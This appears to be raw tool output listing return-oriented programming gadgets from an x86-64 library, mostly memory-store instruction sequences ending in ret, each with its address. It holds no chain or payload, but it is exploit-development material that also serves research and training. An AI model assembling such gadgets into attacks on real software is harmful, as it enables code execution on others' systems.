0x00002aaaaab0a77a : mov dword ptr [rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x00002aaaaab46277 : mov dword ptr [rcx], eax ; ret
0x00002aaaaab4a664 : mov dword ptr [rcx], eax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabf83b4 : mov dword ptr [rcx], ecx ; ret
0x00002aaaaab460d1 : mov dword ptr [rcx], edi ; mov eax, edi ; ret
0x00002aaaaabf8388 : mov dword ptr [rcx], edi ; ret
0x00002aaaaab62c87 : mov dword ptr [rcx], edx ; add rsp, 0x100 ; ret
0x00002aaaaac3d0c1 : mov dword ptr [rcx], edx ; mov byte ptr [rcx + 2], dl ; ret
0x00002aaaaac3d0e0 : mov dword ptr [rcx], edx ; mov byte ptr [rcx + 4], dl ; ret
0x00002aaaaac3d121 : mov dword ptr [rcx], edx ; mov byte ptr [rcx + 8], dl ; ret
0x00002aaaaac3d100 : mov dword ptr [rcx], edx ; mov dword ptr [rcx + 3], edx ; ret
0x00002aaaaac3d141 : mov dword ptr [rcx], edx ; mov dword ptr [rcx + 7], edx ; ret
0x00002aaaaac3d151 : mov dword ptr [rcx], edx ; mov dword ptr [rcx + 8], edx ; ret
0x00002aaaaac3d161 : mov dword ptr [rcx], edx ; mov qword ptr [rcx + 5], rdx ; ret
0x00002aaaaac3d171 : mov dword ptr [rcx], edx ; mov qword ptr [rcx + 6], rdx ; ret
0x00002aaaaac3d181 : mov dword ptr [rcx], edx ; mov qword ptr [rcx + 7], rdx ; ret
0x00002aaaaac3d191 : mov dword ptr [rcx], edx ; mov qword ptr [rcx + 8], rdx ; ret
0x00002aaaaab52722 : mov dword ptr [rcx], edx ; mov rax, rdx ; add rsp, 8 ; ret
0x00002aaaaac3d0f0 : mov dword ptr [rcx], edx ; mov word ptr [rcx + 4], dx ; ret
0x00002aaaaac3d131 : mov dword ptr [rcx], edx ; mov word ptr [rcx + 8], dx ; ret
0x00002aaaaabf8318 : mov dword ptr [rcx], edx ; ret
0x00002aaaaabcacdb : mov dword ptr [rdi + 0x100], edx ; ret
0x00002aaaaabcad12 : mov dword ptr [rdi + 0x108], eax ; xor eax, eax ; ret
0x00002aaaaac071fc : mov dword ptr [rdi + 0x10], 2 ; add rdi, 0x10 ; jmp rcx
0x00002aaaaab7b90d : mov dword ptr [rdi + 0x10], ecx ; lea rax, qword ptr [rdi + 0x11] ; ret
0x00002aaaaab7c75d : mov dword ptr [rdi + 0x10], ecx ; lea rax, qword ptr [rdi + 0x12] ; ret
0x00002aaaaab7b94b : mov dword ptr [rdi + 0x10], ecx ; lea rax, qword ptr [rdi + 0x13] ; ret
0x00002aaaaab7c79b : mov dword ptr [rdi + 0x10], ecx ; lea rax, qword ptr [rdi + 0x14] ; ret
0x00002aaaaab7b9cd : mov dword ptr [rdi + 0x10], ecx ; lea rax, qword ptr [rdi + 0x17] ; ret
0x00002aaaaab7c81d : mov dword ptr [rdi + 0x10], ecx ; lea rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaab7b96b : mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dh ; lea rax, qword ptr [rdi + 0x14] ; ret
0x00002aaaaab7a2db : mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dh ; ret
0x00002aaaaab7c7be : mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dl ; lea rax, qword ptr [rdi + 0x15] ; ret
0x00002aaaaab7afae : mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dl ; ret
0x00002aaaaab7e22e : mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dl ; xor ch, ch ; mov byte ptr [rdi + 0x15], ch ; ret
0x00002aaaaab7b9ed : mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x18], dh ; lea rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaab7a35d : mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x18], dh ; ret
0x00002aaaaab1db3f : mov dword ptr [rdi + 0x10], ecx ; ret
0x00002aaaaab7e1cd : mov dword ptr [rdi + 0x10], ecx ; xor ch, ch ; mov byte ptr [rdi + 0x12], ch ; ret
0x00002aaaaab7e20b : mov dword ptr [rdi + 0x10], ecx ; xor ch, ch ; mov byte ptr [rdi + 0x14], ch ; ret
0x00002aaaaab7e28d : mov dword ptr [rdi + 0x10], ecx ; xor ch, ch ; mov byte ptr [rdi + 0x18], ch ; ret
0x00002aaaaab7c840 : mov dword ptr [rdi + 0x10], edx ; mov byte ptr [rdi + 0x18], cl ; lea rax, qword ptr [rdi + 0x19] ; ret
0x00002aaaaab7b030 : mov dword ptr [rdi + 0x10], edx ; mov byte ptr [rdi + 0x18], cl ; ret
0x00002aaaaab7e2b0 : mov dword ptr [rdi + 0x10], edx ; mov byte ptr [rdi + 0x18], cl ; xor ch, ch ; mov byte ptr [rdi + 0x19], ch ; ret
0x00002aaaaab7ba30 : mov dword ptr [rdi + 0x10], edx ; mov dword ptr [rdi + 0x17], ecx ; lea rax, qword ptr [rdi + 0x1a] ; ret
0x00002aaaaab7c880 : mov dword ptr [rdi + 0x10], edx ; mov dword ptr [rdi + 0x17], ecx ; lea rax, qword ptr [rdi + 0x1b] ; ret
0x00002aaaaab7a3a0 : mov dword ptr [rdi + 0x10], edx ; mov dword ptr [rdi + 0x17], ecx ; ret
0x00002aaaaab7e2f0 : mov dword ptr [rdi + 0x10], edx ; mov dword ptr [rdi + 0x17], ecx ; xor ch, ch ; mov byte ptr [rdi + 0x1b], ch ; ret
0x00002aaaaab7ba50 : mov dword ptr [rdi + 0x10], edx ; mov dword ptr [rdi + 0x18], ecx ; lea rax, qword ptr [rdi + 0x1b] ; ret
0x00002aaaaab7c8a0 : mov dword ptr [rdi + 0x10], edx ; mov dword ptr [rdi + 0x18], ecx ; lea rax, qword ptr [rdi + 0x1c] ; ret
0x00002aaaaab7a3c0 : mov dword ptr [rdi + 0x10], edx ; mov dword ptr [rdi + 0x18], ecx ; ret
0x00002aaaaab7e310 : mov dword ptr [rdi + 0x10], edx ; mov dword ptr [rdi + 0x18], ecx ; xor ch, ch ; mov byte ptr [rdi + 0x1c], ch ; ret
0x00002aaaaab7ba11 : mov dword ptr [rdi + 0x10], edx ; mov word ptr [rdi + 0x18], cx ; lea rax, qword ptr [rdi + 0x19] ; ret
0x00002aaaaab7c861 : mov dword ptr [rdi + 0x10], edx ; mov word ptr [rdi + 0x18], cx ; lea rax, qword ptr [rdi + 0x1a] ; ret
0x00002aaaaab7a381 : mov dword ptr [rdi + 0x10], edx ; mov word ptr [rdi + 0x18], cx ; ret
0x00002aaaaabcad00 : mov dword ptr [rdi + 0x10c], esi ; xor eax, eax ; ret
0x00002aaaaab7ba33 : mov dword ptr [rdi + 0x17], ecx ; lea rax, qword ptr [rdi + 0x1a] ; ret
0x00002aaaaab7c883 : mov dword ptr [rdi + 0x17], ecx ; lea rax, qword ptr [rdi + 0x1b] ; ret
0x00002aaaaab7a3a3 : mov dword ptr [rdi + 0x17], ecx ; ret
0x00002aaaaab7e2f3 : mov dword ptr [rdi + 0x17], ecx ; xor ch, ch ; mov byte ptr [rdi + 0x1b], ch ; ret
0x00002aaaaac10230 : mov dword ptr [rdi + 0x18], eax ; mov eax, 1 ; ret
0x00002aaaaab50133 : mov dword ptr [rdi + 0x18], eax ; mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaab4c837 : mov dword ptr [rdi + 0x18], eax ; mov qword ptr [rsi], rax ; xor eax, eax ; ret
0x00002aaaaaba03f8 : mov dword ptr [rdi + 0x18], eax ; mov rax, -0xe ; ret
0x00002aaaaab7ba15 : mov dword ptr [rdi + 0x18], ecx ; lea rax, qword ptr [rdi + 0x19] ; ret
0x00002aaaaab7c865 : mov dword ptr [rdi + 0x18], ecx ; lea rax, qword ptr [rdi + 0x1a] ; ret
0x00002aaaaab7ba53 : mov dword ptr [rdi + 0x18], ecx ; lea rax, qword ptr [rdi + 0x1b] ; ret
0x00002aaaaab7c8a3 : mov dword ptr [rdi + 0x18], ecx ; lea rax, qword ptr [rdi + 0x1c] ; ret
0x00002aaaaab5015f : mov dword ptr [rdi + 0x18], ecx ; mov qword ptr [rdi + 0x48], rdx ; mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaab7a385 : mov dword ptr [rdi + 0x18], ecx ; ret
0x00002aaaaab7e2d5 : mov dword ptr [rdi + 0x18], ecx ; xor ch, ch ; mov byte ptr [rdi + 0x1a], ch ; ret
0x00002aaaaab7e313 : mov dword ptr [rdi + 0x18], ecx ; xor ch, ch ; mov byte ptr [rdi + 0x1c], ch ; ret
0x00002aaaaac102c2 : mov dword ptr [rdi + 0x18], edx ; mov eax, 1 ; ret
0x00002aaaaac101d1 : mov dword ptr [rdi + 0x18], esi ; mov dword ptr [rdi + 0x28], edx ; mov eax, 1 ; ret
0x00002aaaaac1036e : mov dword ptr [rdi + 0x18], esi ; mov dword ptr [rdi + 0x28], edx ; mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaac101f6 : mov dword ptr [rdi + 0x18], esi ; ret
0x00002aaaaab93b5e : mov dword ptr [rdi + 0x20], 0 ; jmp 0xbad9a
0x00002aaaaac10925 : mov dword ptr [rdi + 0x20], 0 ; mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaabe2b5a : mov dword ptr [rdi + 0x28], ecx ; mov byte ptr [rax], 0x20 ; jmp 0x10db2c
0x00002aaaaabd903b : mov dword ptr [rdi + 0x28], edx ; mov byte ptr [rax], 0xa ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac09d2c : mov dword ptr [rdi + 0x28], edx ; mov eax, 1 ; ret
0x00002aaaaac10371 : mov dword ptr [rdi + 0x28], edx ; mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaabaafea : mov dword ptr [rdi + 0x2c], eax ; mov dword ptr [rdi + 0x30], r8d ; ret
0x00002aaaaabaafe9 : mov dword ptr [rdi + 0x2c], r8d ; mov dword ptr [rdi + 0x30], r8d ; ret
0x00002aaaaabaafee : mov dword ptr [rdi + 0x30], eax ; ret
0x00002aaaaabaafed : mov dword ptr [rdi + 0x30], r8d ; ret
0x00002aaaaab69121 : mov dword ptr [rdi + 0x38], ecx ; ret
0x00002aaaaac09ce4 : mov dword ptr [rdi + 0x38], edx ; mov eax, 1 ; ret
0x00002aaaaaaf58ed : mov dword ptr [rdi + 0x48], 0x4804e7c1 ; add edi, ebp ; call rax
0x00002aaaaab5012f : mov dword ptr [rdi + 0x48], edx ; mov qword ptr [rdi + 0x18], rax ; mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaab50163 : mov dword ptr [rdi + 0x48], edx ; mov qword ptr [rdi + 8], rax ; ret
0x00002aaaaac09c7c : mov dword ptr [rdi + 0x58], 2 ; add rdi, 0x58 ; jmp rcx
0x00002aaaaab5380b : mov dword ptr [rdi + 0x58], ecx ; mov dword ptr [rdi + 4], eax ; ret
0x00002aaaaac093dc : mov dword ptr [rdi + 0x68], 2 ; add rdi, 0x68 ; jmp rcx
0x00002aaaaab0b049 : mov dword ptr [rdi + 0x78], 0xffffffff ; ret
0x00002aaaaabca33e : mov dword ptr [rdi + 0x80], edx ; ret
0x00002aaaaab806a2 : mov dword ptr [rdi + 0xc], eax ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaabf745f : mov dword ptr [rdi + 0xc], edx ; mov qword ptr [rsi], rdi ; ret
0x00002aaaaab7b98d : mov dword ptr [rdi + 0xe], ecx ; lea rax, qword ptr [rdi + 0x15] ; ret
0x00002aaaaab7c7dd : mov dword ptr [rdi + 0xe], ecx ; lea rax, qword ptr [rdi + 0x16] ; ret
0x00002aaaaab7a2fd : mov dword ptr [rdi + 0xe], ecx ; ret
0x00002aaaaab7e24d : mov dword ptr [rdi + 0xe], ecx ; xor ch, ch ; mov byte ptr [rdi + 0x16], ch ; ret
0x00002aaaaab7b92b : mov dword ptr [rdi + 0xf], ecx ; lea rax, qword ptr [rdi + 0x12] ; ret
0x00002aaaaab7c77b : mov dword ptr [rdi + 0xf], ecx ; lea rax, qword ptr [rdi + 0x13] ; ret
0x00002aaaaab7b9ad : mov dword ptr [rdi + 0xf], ecx ; lea rax, qword ptr [rdi + 0x16] ; ret
0x00002aaaaab7c7fd : mov dword ptr [rdi + 0xf], ecx ; lea rax, qword ptr [rdi + 0x17] ; ret
0x00002aaaaab7a2bb : mov dword ptr [rdi + 0xf], ecx ; ret
0x00002aaaaab7e1eb : mov dword ptr [rdi + 0xf], ecx ; xor ch, ch ; mov byte ptr [rdi + 0x13], ch ; ret
0x00002aaaaab7e26d : mov dword ptr [rdi + 0xf], ecx ; xor ch, ch ; mov byte ptr [rdi + 0x17], ch ; ret
0x00002aaaaac2fbc5 : mov dword ptr [rdi + 1], edx ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaac2fa08 : mov dword ptr [rdi + 1], edx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2fca8 : mov dword ptr [rdi + 1], edx ; mov word ptr [rdi], cx ; ret
0x00002aaaaac2fb55 : mov dword ptr [rdi + 2], edx ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaac2f998 : mov dword ptr [rdi + 2], edx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaab10373 : mov dword ptr [rdi + 2], edx ; ret
0x00002aaaaab7b7f7 : mov dword ptr [rdi + 3], edx ; lea rax, qword ptr [rdi + 6] ; ret
0x00002aaaaab7c627 : mov dword ptr [rdi + 3], edx ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaac2fae5 : mov dword ptr [rdi + 3], edx ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaac2f928 : mov dword ptr [rdi + 3], edx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaab7a1e7 : mov dword ptr [rdi + 3], edx ; ret
0x00002aaaaab7e097 : mov dword ptr [rdi + 3], edx ; xor ch, ch ; mov byte ptr [rdi + 7], ch ; ret
0x00002aaaaab72ea3 : mov dword ptr [rdi + 4], eax ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaab72e03 : mov dword ptr [rdi + 4], eax ; mov rax, rdi ; ret
0x00002aaaaab5380e : mov dword ptr [rdi + 4], eax ; ret
0x00002aaaaab1036d : mov dword ptr [rdi + 4], eax ; xor eax, eax ; mov word ptr [rdi + 2], dx ; ret
0x00002aaaaab72ef3 : mov dword ptr [rdi + 4], edx ; lea rax, qword ptr [rdi + 5] ; ret
0x00002aaaaab72f03 : mov dword ptr [rdi + 4], edx ; lea rax, qword ptr [rdi + 6] ; mov byte ptr [rdi + 6], 0 ; ret
0x00002aaaaab7c609 : mov dword ptr [rdi + 4], edx ; lea rax, qword ptr [rdi + 6] ; ret
0x00002aaaaac2f8b8 : mov dword ptr [rdi + 4], edx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaab72e63 : mov dword ptr [rdi + 4], edx ; mov rax, rdi ; mov byte ptr [rdi + 6], 0 ; ret
0x00002aaaaab72df3 : mov dword ptr [rdi + 4], edx ; mov rax, rdi ; ret
0x00002aaaaab7a1d9 : mov dword ptr [rdi + 4], edx ; ret
0x00002aaaaab7e079 : mov dword ptr [rdi + 4], edx ; xor ch, ch ; mov byte ptr [rdi + 6], ch ; ret
0x00002aaaaabca390 : mov dword ptr [rdi + 4], esi ; xor eax, eax ; ret
0x00002aaaaab72ea2 : mov dword ptr [rdi + 4], r8d ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaab72e02 : mov dword ptr [rdi + 4], r8d ; mov rax, rdi ; ret
0x00002aaaaab7b88b : mov dword ptr [rdi + 5], edx ; lea rax, qword ptr [rdi + 0xc] ; ret
0x00002aaaaab7c6cb : mov dword ptr [rdi + 5], edx ; lea rax, qword ptr [rdi + 0xd] ; ret
0x00002aaaaac2f848 : mov dword ptr [rdi + 5], edx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaab7a24b : mov dword ptr [rdi + 5], edx ; ret
0x00002aaaaab7e13b : mov dword ptr [rdi + 5], edx ; xor ch, ch ; mov byte ptr [rdi + 0xd], ch ; ret
0x00002aaaaab7b8ab : mov dword ptr [rdi + 6], edx ; lea rax, qword ptr [rdi + 0xd] ; ret
0x00002aaaaab7c6eb : mov dword ptr [rdi + 6], edx ; lea rax, qword ptr [rdi + 0xe] ; ret
0x00002aaaaac2f7d8 : mov dword ptr [rdi + 6], edx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaab7a25b : mov dword ptr [rdi + 6], edx ; ret
0x00002aaaaab7e15b : mov dword ptr [rdi + 6], edx ; xor ch, ch ; mov byte ptr [rdi + 0xe], ch ; ret
0x00002aaaaab7b849 : mov dword ptr [rdi + 7], edx ; lea rax, qword ptr [rdi + 0xa] ; ret
0x00002aaaaab7c689 : mov dword ptr [rdi + 7], edx ; lea rax, qword ptr [rdi + 0xb] ; ret
0x00002aaaaab7b8cb : mov dword ptr [rdi + 7], edx ; lea rax, qword ptr [rdi + 0xe] ; ret
0x00002aaaaab7c70b : mov dword ptr [rdi + 7], edx ; lea rax, qword ptr [rdi + 0xf] ; ret
0x00002aaaaac2f768 : mov dword ptr [rdi + 7], edx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaab7a229 : mov dword ptr [rdi + 7], edx ; ret
0x00002aaaaab7e0f9 : mov dword ptr [rdi + 7], edx ; xor ch, ch ; mov byte ptr [rdi + 0xb], ch ; ret
0x00002aaaaab7e17b : mov dword ptr [rdi + 7], edx ; xor ch, ch ; mov byte ptr [rdi + 0xf], ch ; ret
0x00002aaaaabd3648 : mov dword ptr [rdi + 8], 0 ; ret
0x00002aaaaab80e85 : mov dword ptr [rdi + 8], eax ; je 0xabe40 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab50137 : mov dword ptr [rdi + 8], eax ; ret
0x00002aaaaab1db38 : mov dword ptr [rdi + 8], eax ; shr r9, cl ; mov qword ptr [rdi + 0x10], r9 ; ret
0x00002aaaaab1dac4 : mov dword ptr [rdi + 8], ecx ; ret
0x00002aaaaab7c66b : mov dword ptr [rdi + 8], edx ; lea rax, qword ptr [rdi + 0xa] ; ret
0x00002aaaaab7b869 : mov dword ptr [rdi + 8], edx ; lea rax, qword ptr [rdi + 0xb] ; ret
0x00002aaaaab7c6a9 : mov dword ptr [rdi + 8], edx ; lea rax, qword ptr [rdi + 0xc] ; ret
0x00002aaaaab7b82b : mov dword ptr [rdi + 8], edx ; lea rax, qword ptr [rdi + 9] ; ret
0x00002aaaaab1d430 : mov dword ptr [rdi + 8], edx ; mov eax, ebx ; adc rax, rdx ; pop rbp ; pop rbx ; ret
0x00002aaaaab1d2f4 : mov dword ptr [rdi + 8], edx ; mov eax, ecx ; adc eax, eax ; ret
0x00002aaaaab0fc94 : mov dword ptr [rdi + 8], edx ; mov qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaab50fb3 : mov dword ptr [rdi + 8], edx ; movzx eax, byte ptr [rax - 1] ; and dword ptr [rbx], 0xffffffef ; pop rbx ; ret
0x00002aaaaab4cf5f : mov dword ptr [rdi + 8], edx ; movzx eax, byte ptr [rax] ; ret
0x00002aaaaab0fc85 : mov dword ptr [rdi + 8], edx ; ret
0x00002aaaaab7e0db : mov dword ptr [rdi + 8], edx ; xor ch, ch ; mov byte ptr [rdi + 0xa], ch ; ret
0x00002aaaaab7e119 : mov dword ptr [rdi + 8], edx ; xor ch, ch ; mov byte ptr [rdi + 0xc], ch ; ret
0x00002aaaaabd0772 : mov dword ptr [rdi + 8], esi ; ret
0x00002aaaaab0b472 : mov dword ptr [rdi + rax*8], ecx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab1e0ad : mov dword ptr [rdi + rbx*8 + 8], ecx ; add rdx, r8 ; mov rax, rdx ; pop rbx ; ret
0x00002aaaaabac098 : mov dword ptr [rdi + rcx], 0xe084 ; add byte ptr [rax - 0x7d], cl ; ret 0x4c04
0x00002aaaaabf8498 : mov dword ptr [rdi + rdx + 0x10], edx ; ret
0x00002aaaaabf8493 : mov dword ptr [rdi + rdx + 8], ecx ; mov qword ptr [rdi + rdx + 0x10], r10 ; ret
0x00002aaaaac21f83 : mov dword ptr [rdi + rdx - 2], ecx ; ret
0x00002aaaaab63765 : mov dword ptr [rdi + rdx - 4], ecx ; ret
0x00002aaaaab6376e : mov dword ptr [rdi + rdx - 8], ecx ; ret
0x00002aaaaac26cc5 : mov dword ptr [rdi - 0x10], ebx ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaac26d03 : mov dword ptr [rdi - 0x10], ebx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaab1da2f : mov dword ptr [rdi - 0x10], ecx ; ret
0x00002aaaaac26e78 : mov dword ptr [rdi - 0x11], ebx ; mov qword ptr [rdi - 9], r8 ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac26f74 : mov dword ptr [rdi - 0x11], ebx ; mov qword ptr [rdi - 9], rcx ; mov byte ptr [rdi - 1], dl ; ret
0x00002aaaaac26ec0 : mov dword ptr [rdi - 0x11], ebx ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac27048 : mov dword ptr [rdi - 0x12], ebx ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac27228 : mov dword ptr [rdi - 0x13], ebx ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac27418 : mov dword ptr [rdi - 0x14], ebx ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac275e9 : mov dword ptr [rdi - 0x15], ebx ; mov qword ptr [rdi - 0xd], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac277e9 : mov dword ptr [rdi - 0x16], ebx ; mov qword ptr [rdi - 0xe], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac279e9 : mov dword ptr [rdi - 0x17], ebx ; mov qword ptr [rdi - 0xf], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac26cc1 : mov dword ptr [rdi - 0x18], edx ; mov qword ptr [rdi - 0x10], r11 ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaac26cff : mov dword ptr [rdi - 0x18], edx ; mov qword ptr [rdi - 0x10], r11 ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac2704c : mov dword ptr [rdi - 0xa], ecx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac2f218 : mov dword ptr [rdi - 0xa], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac2722c : mov dword ptr [rdi - 0xb], ecx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac2f198 : mov dword ptr [rdi - 0xb], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac2741c : mov dword ptr [rdi - 0xc], ecx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac2f118 : mov dword ptr [rdi - 0xc], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac275ed : mov dword ptr [rdi - 0xd], ecx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac2f089 : mov dword ptr [rdi - 0xd], edx ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaac277ed : mov dword ptr [rdi - 0xe], ecx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac2eff9 : mov dword ptr [rdi - 0xe], edx ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaac279ed : mov dword ptr [rdi - 0xf], ecx ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaac2ef69 : mov dword ptr [rdi - 0xf], edx ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaab7b170 : mov dword ptr [rdi - 1], edx ; ret
0x00002aaaaac273cd : mov dword ptr [rdi - 2], ecx ; ret
0x00002aaaaac271e5 : mov dword ptr [rdi - 2], edx ; ret
0x00002aaaaac273c9 : mov dword ptr [rdi - 3], edx ; mov word ptr [rdi - 2], cx ; ret
0x00002aaaaab72d4f : mov dword ptr [rdi - 4], eax ; mov rax, rdi ; ret
0x00002aaaaac277a9 : mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac26e7f : mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaab72dab : mov dword ptr [rdi - 5], eax ; mov rax, rdi ; ret
0x00002aaaaac277a6 : mov dword ptr [rdi - 5], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaab72d35 : mov dword ptr [rdi - 6], eax ; mov rax, rdi ; ret
0x00002aaaaac279a6 : mov dword ptr [rdi - 6], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaab72dc9 : mov dword ptr [rdi - 7], eax ; mov rax, rdi ; ret
0x00002aaaaac27ba6 : mov dword ptr [rdi - 7], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaab1da28 : mov dword ptr [rdi - 8], eax ; shl r9, cl ; mov qword ptr [rdi - 0x10], r9 ; ret
0x00002aaaaab1d9ba : mov dword ptr [rdi - 8], ecx ; ret
0x00002aaaaac26d07 : mov dword ptr [rdi - 8], edx ; ret
0x00002aaaaac26e7c : mov dword ptr [rdi - 9], eax ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac26f78 : mov dword ptr [rdi - 9], ecx ; mov byte ptr [rdi - 1], dl ; ret
0x00002aaaaac26ec4 : mov dword ptr [rdi - 9], ecx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac2f298 : mov dword ptr [rdi - 9], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaab0f7a0 : mov dword ptr [rdi], 0 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab947dc : mov dword ptr [rdi], eax ; jmp 0xbf36f
0x00002aaaaabd3635 : mov dword ptr [rdi], eax ; mov qword ptr [rdi + 8], rsi ; ret
0x00002aaaaab1f60b : mov dword ptr [rdi], eax ; mov rax, rdi ; ret
0x00002aaaaabc858f : mov dword ptr [rdi], eax ; mov rdi, rbx ; call 0x1f7f7
0x00002aaaaab1d9b4 : mov dword ptr [rdi], eax ; shl r9, cl ; mov qword ptr [rdi - 8], r9 ; ret
0x00002aaaaab1dabe : mov dword ptr [rdi], eax ; shr r9, cl ; mov qword ptr [rdi + 8], r9 ; ret
0x00002aaaaab0b55b : mov dword ptr [rdi], eax ; xor eax, eax ; ret
0x00002aaaaab29d86 : mov dword ptr [rdi], ebp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab72d72 : mov dword ptr [rdi], ecx ; add rdi, 2 ; mov rax, rdi ; ret
0x00002aaaaab72ed0 : mov dword ptr [rdi], ecx ; lea rax, qword ptr [rdi + 3] ; ret
0x00002aaaaab7b7c5 : mov dword ptr [rdi], ecx ; lea rax, qword ptr [rdi + 4] ; ret
0x00002aaaaab7b817 : mov dword ptr [rdi], ecx ; lea rax, qword ptr [rdi + 8] ; ret
0x00002aaaaab7b7a4 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 2], dh ; lea rax, qword ptr [rdi + 2] ; ret
0x00002aaaaab7a1a4 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 2], dh ; ret
0x00002aaaaab7c5c7 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 2], dl ; lea rax, qword ptr [rdi + 3] ; ret
0x00002aaaaab7ae77 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 2], dl ; ret
0x00002aaaaab7e037 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 2], dl ; xor ch, ch ; mov byte ptr [rdi + 3], ch ; ret
0x00002aaaaab72ee0 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 4], 0 ; lea rax, qword ptr [rdi + 4] ; ret
0x00002aaaaab72e50 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 4], 0 ; mov rax, rdi ; ret
0x00002aaaaab7c5f5 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 4], dl ; lea rax, qword ptr [rdi + 5] ; ret
0x00002aaaaab7ae95 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 4], dl ; ret
0x00002aaaaab7e065 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 4], dl ; xor ch, ch ; mov byte ptr [rdi + 5], ch ; ret
0x00002aaaaab7c647 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 8], dl ; lea rax, qword ptr [rdi + 9] ; ret
0x00002aaaaab7aed7 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 8], dl ; ret
0x00002aaaaab7e0b7 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 8], dl ; xor ch, ch ; mov byte ptr [rdi + 9], ch ; ret
0x00002aaaaab7b7f5 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 3], edx ; lea rax, qword ptr [rdi + 6] ; ret
0x00002aaaaab7c625 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 3], edx ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaab7a1e5 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 3], edx ; ret
0x00002aaaaab7e095 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 3], edx ; xor ch, ch ; mov byte ptr [rdi + 7], ch ; ret
0x00002aaaaab72ea0 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 4], r8d ; lea rax, qword ptr [rdi + 7] ; ret
